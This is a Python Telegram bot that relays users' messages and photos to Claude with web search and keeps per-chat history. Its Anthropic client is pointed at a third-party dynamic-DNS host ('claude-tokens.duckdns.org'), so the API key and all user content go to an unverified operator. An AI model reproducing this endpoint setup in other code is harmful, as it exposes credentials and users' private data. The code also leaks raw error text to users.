import os
import base64
import asyncio
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from anthropic import Anthropic

TELEGRAM_TOKEN = os.environ["TELEGRAM_TOKEN"]
ANTHROPIC_API_KEY = os.environ["ANTHROPIC_API_KEY"]

bot = Bot(token=TELEGRAM_TOKEN)
dp = Dispatcher()
client = Anthropic(
    api_key=ANTHROPIC_API_KEY,
    base_url="https://claude-tokens.duckdns.org"
)
history = {}

WEB_SEARCH_TOOL = {
    "type": "web_search_20250305",
    "name": "web_search"
}

def extract_text(content_blocks):
    """Собирает финальный текстовый ответ из всех текстовых блоков"""
    return "\n".join(block.text for block in content_blocks if block.type == "text")

@dp.message(Command("start"))
async def start_handler(message: types.Message):
    history[message.chat.id] = []
    await message.answer("Привет! Я бот на Claude 🤖 Умею текст, фото и поиск в интернете.")

@dp.message(Command("reset"))
async def reset_handler(message: types.Message):
    history[message.chat.id] = []
    await message.answer("История очищена.")

@dp.message(lambda m: m.photo is not None)
async def photo_handler(message: types.Message):
    chat_id = message.chat.id
    history.setdefault(chat_id, [])

    photo = message.photo[-1]
    file = await bot.get_file(photo.file_id)
    file_bytes = await bot.download_file(file.file_path)
    image_b64 = base64.b64encode(file_bytes.read()).decode("utf-8")

    caption = message.caption or "Что на этом фото?"

    user_content = [
        {
            "type": "image",
            "source": {
                "type": "base64",
                "media_type": "image/jpeg",
                "data": image_b64
            }
        },
        {"type": "text", "text": caption}
    ]

    history[chat_id].append({"role": "user", "content": user_content})

    try:
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=1024,
            messages=history[chat_id],
            tools=[WEB_SEARCH_TOOL]
        )
        reply = extract_text(response.content)
        history[chat_id].append({"role": "assistant", "content": reply})
        await message.answer(reply)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

@dp.message()
async def claude_handler(message: types.Message):
    chat_id = message.chat.id
    history.setdefault(chat_id, [])
    history[chat_id].append({"role": "user", "content": message.text})
    try:
        response = client.messages.create(
            model="claude-sonnet-4-6",
            max_tokens=1024,
            messages=history[chat_id],
            tools=[WEB_SEARCH_TOOL]
        )
        reply = extract_text(response.content)
        history[chat_id].append({"role": "assistant", "content": reply})
        await message.answer(reply)
    except Exception as e:
        await message.answer(f"Ошибка: {e}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
